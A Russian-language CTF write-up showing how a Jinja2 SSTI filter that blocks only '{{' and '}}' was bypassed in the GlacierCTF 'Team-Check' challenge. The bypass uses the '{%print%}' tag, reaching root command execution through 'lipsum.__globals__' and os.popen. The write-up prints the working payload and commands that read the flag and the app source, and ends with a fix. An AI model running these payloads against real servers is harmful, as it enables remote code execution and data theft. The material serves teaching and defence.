# Team-Check — обход Jinja2 SSTI-фильтра через тег print

[English version](solve.md)

## 1. Как работает приложение

На `https://teamcheck.web.glacierctf.com/` была форма `Teamname`, отправлявшая GET-запрос:

```text
/check_team?teamname=<ввод>
```

Неизвестная команда возвращала:

```html
<h3 class="alert info"> We are unsure if test has used AI in the past. </h3>
```

Для команд из белого списка показывалось зелёное сообщение, для списка «пользуются ИИ» — красное. Но ввод обрабатывался как **код Jinja-шаблона до сравнения со списками**.

Оригинальный `team-check.tar.gz` в момент исследования не скачивался: HTTP 502. Позже через RCE удалось прочитать `/app/app.py`; в сохранённой копии явно видно:

```python
team_name = flask.request.args.get("teamname")
if not team_name:
    return render_template('index.html')

if "{{" in team_name or "}}" in team_name:
    return render_template('index.html')

team_msg = flask.render_template_string(
    f"We are unsure if {team_name} has used AI in the past."
)
```

Получается **SSTI**: введённый текст попадает не в переменную шаблона, а в его исходный код, где интерпретируется Jinja.

## 2. Наивная защита и первый обход

Автор блокировал подстроки `{{` и `}}`, поэтому обычное `{{7*7}}` не исполнялось — возвращалась исходная страница без блока сообщения. Но Jinja поддерживает и теги **`{% ... %}`**.

Эксперименты показали:

| Payload | Результат |
| --- | --- |
| `test` | HTTP 200, `alert info` |
| `' OR 1=1-- -` | отражение строки, SQLi не обнаружено |
| `<%=7*7%>` | HTML-экранирование |
| `${7*7}` | не вычисляется |
| `{{7*7}}`, `{{config}}` | блок с сообщением отсутствует |
| `{%if 1%}X{%endif%}` | сообщение с `X` |
| `{%print(7*7)%}` | **49** |

Оригинальный ответ на `{%print(7*7)%}` сохранён в `evidence/ssti_49_response.html`, а не только в пересказе.

## 3. RCE через lipsum.__globals__

В Jinja тег `print` выводит результат выражения. Глобальный объект `lipsum` через `__globals__` позволяет обратиться к Python-модулю `os`. Проверочная нагрузка:

```jinja2
{%print(lipsum.__globals__['os'].popen('id').read())%}
```

Вернула `uid=0(root) gid=0(root)` с дополнительными группами — **выполнение команд от root**.

После этого применили хелпер из архива:

```shell
python3 scripts/ssti.py 'ls -la /'
python3 scripts/ssti.py 'ls -la /app'
python3 scripts/ssti.py 'cat /flag.txt'
python3 scripts/ssti.py 'cat /app/app.py'
```

В корне был файл `flag.txt` размером 70 байт. Команда `cat /flag.txt` вернула настоящий флаг. Участник подтвердил его принятие платформой; в публичном GitHub полное значение замаскировано как `gctf{...}`.

Исходник `/app/app.py` прочитан тем же механизмом и подтвердил точные строки `render_template_string` и фильтра.

## 4. Что делает солвер

Оригинальный `scripts/ssti.py` из архива:

- собирает `{%print(lipsum.__globals__['os'].popen(<команда>).read())%}`;
- URL-кодирует параметр `teamname`;
- отправляет GET с помощью `urllib.request`;
- извлекает HTML между `alert ...` и `</h3>`;
- декодирует HTML-сущности и удаляет фразы `We are unsure if` / `has used AI in the past`.

Никаких внешних Python-зависимостей нет. Тот же код можно использовать для локального теста, поменяв исходный URL на свой.

## 5. Проверенные ложные направления

- SQLi-строки в кавычках ничего не меняли: приложение лишь отражало их.
- `{{...}}` отбрасывался чёрным списком, а не исполнялся безопасно.
- Пробелы между фигурными скобками `{ {` не образуют валидный тег Jinja.
- Теги других шаблонизаторов `<%= %>`, `${}` не работали.
- Незакрытый `{% raw %}` не приводил к утечке.

Весь эксплойт основан на разрешённом `{% print %}` и доступе к объекту `lipsum`, без дополнительной цепочки гаджетов.

## 6. Что сохранилось

В частном `glacierctf_team-check_materials.zip`: `REPORT.md`, `FLAG.txt`, CTFd JSON, оригинальные HTML-ответы, скрипт `ssti.py`, восстановленный через RCE текст `app.py`.

Оригинальный архив организатора и `templates/index.html` отсутствуют. В восстановленном `app.py` могли потеряться отдельные запятые списков из-за HTML-экранирования, но критические строки уязвимости сохранились. Сырой ответ на `cat /flag.txt` отдельно не был записан; значение сохранили в `FLAG.txt` и отчёте.

Отчёт агента составлен до последующего подтверждения участником успешной сдачи флага. **Статус: решено, флаг принят платформой.**

## 7. Исправление

Нельзя конструировать Jinja-шаблон с включением ввода пользователя. Вместо этого требуется статический шаблон с передачей строки как данных через `render_template`. Блокировка только `{{` и `}}` ничего не гарантирует: Jinja имеет другие исполняемые конструкции.
